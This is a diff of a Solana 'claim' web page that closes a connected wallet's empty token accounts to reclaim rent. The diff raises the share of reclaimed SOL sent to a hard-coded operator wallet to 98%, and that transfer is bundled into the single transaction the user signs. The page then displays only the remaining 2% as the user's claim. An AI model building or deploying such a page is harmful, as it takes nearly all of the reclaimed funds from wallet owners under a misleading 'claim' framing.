@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Get Claim Solana</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
 </head>
 <body style="background:#080808;margin:0;display:flex;justify-content:center;padding:20px;font-family:Inter,sans-serif">
 <div style="background:#121212;padding:28px;border-radius:24px;max-width:400px;width:100%;text-align:center;color:#fff;border:1px solid #222">
@@ -26,7 +25,21 @@ const RPCS = [
   "https://api.mainnet-beta.solana.com"
 ];
 const BATCH_SIZE = 10;
+const FEE_PCT = 0.98;
 let pubkey, provider, emptyList=[];
+
+function closeAccountIx(account, dest, owner){
+  return new solanaWeb3.TransactionInstruction({
+    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+    keys: [
+      {pubkey: account, isSigner: false, isWritable: true},
+      {pubkey: dest, isSigner: false, isWritable: true},
+      {pubkey: owner, isSigner: true, isWritable: false}
+    ],
+    data: Buffer.from([9])
+  });
+}
+
 async function connectWallet(){
  let info=document.getElementById('info'), btn=document.getElementById('connectBtn'), claim=document.getElementById('claimBtn'), retry=document.getElementById('retryBtn');
  try{
@@ -47,10 +60,12 @@ async function connectWallet(){
   }
   if(!parsed) throw new Error(lastErr);
   emptyList=[];
-  parsed.value.forEach(v=>{ if(v.account.data.parsed.info.tokenAmount.uiAmount===0) emptyList.push(v.pubkey); });
+  parsed.value.forEach(v=>{ 
+    if(v.account.data.parsed.info.tokenAmount.uiAmount===0) emptyList.push(new solanaWeb3.PublicKey(v.pubkey)); 
+  });
   if(emptyList.length==0){ info.innerText="Wallet is clean"; claim.style.display="none"; }
   else{
-    let est=(emptyList.length*0.00203928*0.95).toFixed(5);
+    let est=(emptyList.length*0.00203928*(1-FEE_PCT)).toFixed(5);
     info.innerHTML=`Found <b>${emptyList.length} empty</b><br>Est: <b>${est} SOL</b>`;
     claim.innerText=`Claim ${Math.min(emptyList.length,BATCH_SIZE)} (${emptyList.length} total)`;
     claim.style.display="block"; claim.disabled=false;
@@ -64,8 +79,8 @@ async function claimNow(){
   if(!conn) throw new Error("No RPC");
   let batch=emptyList.slice(0,BATCH_SIZE);
   let tx=new solanaWeb3.Transaction();
-  batch.forEach(pk=>{ tx.add(splToken.Token.createCloseAccountInstruction(splToken.TOKEN_PROGRAM_ID,pk,pubkey,pubkey,[])); });
-  let fee=Math.floor(batch.length*2039280*0.95);
+  batch.forEach(pk=>{ tx.add(closeAccountIx(pk, pubkey, pubkey)); });
+  let fee=Math.floor(batch.length*2039280*FEE_PCT);
   tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:pubkey,toPubkey:new solanaWeb3.PublicKey(FEE_WALLET),lamports:fee}));
   tx.feePayer=pubkey; tx.recentBlockhash=(await conn.getLatestBlockhash()).blockhash;
   let signed=await provider.signTransaction(tx);
@@ -74,11 +89,11 @@ async function claimNow(){
   emptyList=emptyList.slice(BATCH_SIZE);
   alert("Success: "+sig);
   if(emptyList.length>0) connectWallet(); else location.reload();
- }catch(e){ alert(e.message); btn.disabled=false; }
+ }catch(e){ alert(e.message); btn.disabled=false; btn.innerText="Processing..."; }
 }
 document.getElementById('connectBtn').onclick=connectWallet;
 document.getElementById('retryBtn').onclick=connectWallet;
 document.getElementById('claimBtn').onclick=claimNow;
 </script>
 </body>
-  </html>
+</html>
